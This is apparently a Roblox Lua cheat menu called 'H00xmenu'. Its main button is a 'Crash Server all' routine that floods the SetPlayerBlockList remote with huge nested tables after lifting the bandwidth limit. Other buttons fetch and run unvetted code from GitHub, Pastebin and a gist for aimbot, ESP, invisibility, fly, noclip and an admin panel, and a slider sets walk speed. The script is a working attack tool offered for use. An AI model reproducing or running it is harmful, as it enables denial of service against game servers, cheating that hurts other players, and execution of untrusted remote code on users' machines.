local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()

local Window = Library.CreateLib("H00xmenu From H00xteam", "RJTheme3")

local Tab = Window:NewTab("Tools")

local Section = Tab:NewSection("Crash Server all(Beta)")

Section:NewButton("Crash Server all(Beta)", "Crash Server all(Beta)", function()
    while wait(0.6) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end

for i = 1, maximum do
     table.insert(maintable, spammedtable)
end

for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(250, 2) --// change values if client crashes.
end
end)

local Section = Tab:NewSection("Esp,Aimbot")

Section:NewButton("Aim-bot,Esp", "Aim-bot,Esp", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yahahahau/Ultimate-Esp-v1/refs/heads/main/Ultimate%20esp%20v1.lua"))()
end)

local Section = Tab:NewSection("Speed")

Section:NewSlider("SliderText", "SliderInfo", 1000, 0, function(s) -- 500 (Макс. значение) | 0 (Мин. значение)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

local Section = Tab:NewSection("Invisibility")

Section:NewButton("Invisibility", "Press the button and you'll be invisible", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
end)

local Section = Tab:NewSection("Fly")

Section:NewButton("Fly", "On Fly", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
end)

local Section = Tab:NewSection("Noclip")

Section:NewButton("Noclip", "On Noclip", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/2JZWpiKn", true))()
end)

local Section = Tab:NewSection("Admin Panel")

Section:NewButton("Admin Panel", "Admin Panel Reviz V2", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/princemiguel1234/af2a4841416e2aa41cce2017a14f2fff/raw/471718ec692954af5028cb8f922f00c66afd954d/Reviz%20Admin%20V2"))()
end)
